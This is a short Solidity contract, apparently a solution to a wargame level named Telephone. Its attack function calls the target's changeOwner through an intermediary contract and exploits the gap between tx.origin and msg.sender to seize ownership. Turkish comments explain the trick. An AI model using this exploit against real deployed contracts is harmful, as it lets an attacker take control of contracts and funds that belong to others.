// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone public target;

    constructor(address _targetAddress) {
        target = Telephone(_targetAddress);
    }

    function attack(address _newOwner) public {
        // Çağrı bu kontrat üzerinden gittiği için:
        // tx.origin = İşlemi başlatan cüzdan adresimiz
        // msg.sender = TelephoneAttacker adresi
        target.changeOwner(_newOwner);
    }
}